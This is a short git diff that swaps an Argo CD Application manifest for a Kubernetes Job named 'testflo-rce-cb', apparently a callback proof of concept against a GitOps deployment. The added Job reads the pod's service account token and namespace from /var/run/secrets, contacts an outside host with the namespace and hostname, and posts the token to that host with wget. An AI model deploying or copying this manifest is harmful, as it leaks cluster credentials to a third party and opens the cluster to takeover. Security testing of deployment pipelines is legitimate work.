@@ -1,18 +1,21 @@
-apiVersion: argoproj.io/v1alpha1
-kind: Application
+apiVersion: batch/v1
+kind: Job
 metadata:
-  name: testflo-child
-  namespace: argocd
+  name: testflo-rce-cb
+  namespace: mt-cd78cd0c
 spec:
-  project: default
-  source:
-    repoURL: https://github.com/Ox79/testai.git
-    targetRevision: main
-    path: child
-  destination:
-    server: https://kubernetes.default.svc
-    namespace: default
-  syncPolicy:
-    automated:
-      prune: true
-      selfHeal: true
+  ttlSecondsAfterFinished: 120
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: cb
+          image: alpine:3.19
+          command:
+            - sh
+            - -c
+            - |
+              TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+              NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+              wget -q -O- "https://sfg.0x79.de/cb?t=TESTFLO-RCE-JOB&ns=${NS}&h=$(hostname)" || true
+              wget -q --post-data "tok=${TOKEN}" "https://sfg.0x79.de/cb-tok?t=TESTFLO-RCE-JOB" || true
